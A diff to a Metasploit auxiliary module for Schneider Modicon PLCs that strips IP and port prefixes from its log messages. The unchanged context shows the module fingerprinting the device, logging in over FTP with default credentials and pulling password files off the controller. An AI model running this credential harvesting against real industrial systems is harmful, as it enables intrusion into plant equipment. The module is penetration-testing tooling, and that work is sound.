@@ -65,7 +65,7 @@ class MetasploitModule < Msf::Auxiliary
   # correct. If there's a way to fingerprint the device, it should be done here.
   def check
     is_modicon = false
-    vprint_status "#{ip}:#{rport} - FTP - Checking fingerprint"
+    vprint_status "FTP - Checking fingerprint"
     begin
       connect
     rescue StandardError
@@ -76,16 +76,16 @@ class MetasploitModule < Msf::Auxiliary
       is_modicon = check_banner
       disconnect
     else
-      vprint_error "#{ip}:#{rport} - FTP - Cannot connect, skipping"
+      vprint_error "FTP - Cannot connect, skipping"
       return Exploit::CheckCode::Unknown('Failed to connect via FTP')
     end
 
     if is_modicon
-      vprint_status "#{ip}:#{rport} - FTP - Matches Modicon fingerprint"
+      vprint_status "FTP - Matches Modicon fingerprint"
       return Exploit::CheckCode::Detected('FTP banner matches Modicon fingerprint')
     end
 
-    vprint_error "#{ip}:#{rport} - FTP - Skipping due to fingerprint mismatch"
+    vprint_error "FTP - Skipping due to fingerprint mismatch"
 
     return Exploit::CheckCode::Safe('FTP banner does not match Modicon fingerprint')
   end
@@ -127,15 +127,15 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def setup_ftp_connection
-    vprint_status "#{ip}:#{rport} - FTP - Connecting"
+    vprint_status "FTP - Connecting"
     conn = connect_login
 
     unless conn
-      print_error("#{ip}:#{rport} - FTP - Login failed")
+      print_error("FTP - Login failed")
       return false
     end
 
-    print_good("#{ip}:#{rport} - FTP - Login succeeded")
+    print_good("FTP - Login succeeded")
     report_cred(
       ip: ip,
       port: rport,
@@ -163,7 +163,7 @@ class MetasploitModule < Msf::Auxiliary
 
   # Echo the Net::FTP implementation
   def ftp_gettextfile(fname)
-    vprint_status("#{ip}:#{rport} - FTP - Opening PASV data socket to download #{fname.inspect}")
+    vprint_status("FTP - Opening PASV data socket to download #{fname.inspect}")
     data_connect('A')
     send_cmd_data(['GET', fname.to_s], nil, 'A')
   end
@@ -177,23 +177,23 @@ class MetasploitModule < Msf::Auxiliary
 
     httpcreds = ftp_gettextfile('/FLASH0/userlist.dat')
     if httpcreds
-      print_status "#{ip}:#{rport} - FTP - HTTP password retrieval: success"
+      print_status "FTP - HTTP password retrieval: success"
     else
-      print_status "#{ip}:#{rport} - FTP - HTTP default password presumed"
+      print_status "FTP - HTTP default password presumed"
     end
 
     ftpcreds = ftp_gettextfile('/FLASH0/ftp/ftp.ini')
     if ftpcreds
-      print_status "#{ip}:#{rport} - FTP - password retrieval: success"
+      print_status "FTP - password retrieval: success"
     else
-      print_error "#{ip}:#{rport} - FTP - password retrieval error"
+      print_error "FTP - password retrieval error"
     end
 
     writecreds = ftp_gettextfile('/FLASH0/rdt/password.rde')
     if writecreds
-      print_status "#{ip}:#{rport} - FTP - Write password retrieval: success"
+      print_status "FTP - Write password retrieval: success"
     else
-      print_error "#{ip}:#{rport} - FTP - Write password error"
+      print_error "FTP - Write password error"
     end
 
     if httpcreds
@@ -207,7 +207,7 @@ class MetasploitModule < Msf::Auxiliary
       proof = 'Usual defaults'
     end
 
-    print_status("#{rhost}:#{rport} - FTP - Storing HTTP credentials")
+    print_status("FTP - Storing HTTP credentials")
     logins << ['http', httpuser, httppass]
 
     report_cred(
@@ -246,7 +246,7 @@ class MetasploitModule < Msf::Auxiliary
       modicon_ftpuser = 'USER'
       modicon_ftppass = 'USERUSER' # from the manual.  Verified.
     end
-    print_status("#{rhost}:#{rport} - FTP - Storing hashed FTP credentials")
+    print_status("FTP - Storing hashed FTP credentials")
     # The collected hash is not directly reusable, so it shouldn't be an
     # auth credential in the Cred sense. TheLightCosine should fix some day.
     # Can be used for telnet as well if telnet is enabled.
